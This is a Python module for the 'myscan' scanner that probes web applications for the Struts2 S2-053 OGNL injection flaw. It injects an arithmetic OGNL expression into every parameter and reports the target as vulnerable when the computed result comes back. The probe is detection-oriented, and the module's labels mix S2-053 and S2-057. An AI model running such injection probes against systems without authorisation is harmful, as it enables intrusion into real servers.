#!/usr/bin/env python3
# @Time    : 2020-04-09
# @Author  : caicai
# @File    : poc_struts2-053.py



import random
from myscan.config import scan_set
from myscan.lib.parse.dictdata_parser import dictdata_parser  # 写了一些操作dictdata的方法的类
from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.lib.helper.helper_socket import socket_send_withssl, socket_send  # 如果需要，socket的方法封装


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata") #python的dict数据，详情请看docs/开发指南Example dict数据示例
                                 #scheme的poc不同perfoler和perfile,没有workdata没有data字段,所以无self.url
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "Struts2-053"
        self.vulmsg="Struts2-057远程代码执行"
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        # 添加限定条件
        if self.dictdata.get("url").get("extension").lower() not in ["do", "action"]:
            return
        self.parser = dictdata_parser(self.dictdata)
        params = self.dictdata.get("request").get("params").get("params_url") + \
                 self.dictdata.get("request").get("params").get("params_body")
        ran_a = random.randint(10000000, 20000000)
        ran_b = random.randint(1000000, 2000000)
        ran_number = '%{{{}-{}}}'.format(ran_a, ran_b)
        check = str(ran_a - ran_b).encode()
        if params:
            for param in params:
                req = self.parser.getreqfromparam(param, "w",ran_number )
                r = request(**req)
                if r!=None and check in r.content:
                    parser_ = response_parser(r)
                    self.result.append({
                        "name": self.name,
                        "url": parser_.geturl().split("?")[0],
                        "level": self.level,  # 0:Low  1:Medium 2:High
                        "detail": {
                            "vulmsg": self.vulmsg,
                            "request": parser_.getrequestraw(),
                            "response": parser_.getresponseraw(),
                        }
                    })
                    return


